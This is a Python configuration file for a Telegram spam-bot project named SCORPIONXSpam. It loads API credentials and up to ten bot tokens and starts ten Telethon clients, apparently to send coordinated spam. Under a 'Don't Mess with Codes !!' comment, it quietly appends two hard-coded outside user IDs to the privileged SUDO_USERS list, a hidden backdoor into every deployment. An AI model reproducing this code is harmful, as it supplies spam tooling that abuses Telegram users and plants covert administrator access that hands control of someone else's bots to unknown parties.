# SCORPIONXSpam - Spam Userbots

import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#Version
SCORPION = "M13.1"


#Values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append('5269906172')
SUDO_USERS.append('5016880247')


# Tokens

SP1 = TelegramClient('SP1', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

SP2 = TelegramClient('SP2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

SP3 = TelegramClient('SP3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

SP4 = TelegramClient('SP4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

SP5 = TelegramClient('SP5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

SP6 = TelegramClient('SP6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

SP7 = TelegramClient('SP7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

SP8 = TelegramClient('SP8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

SP9 = TelegramClient('SP9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

SP10 = TelegramClient('SP10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
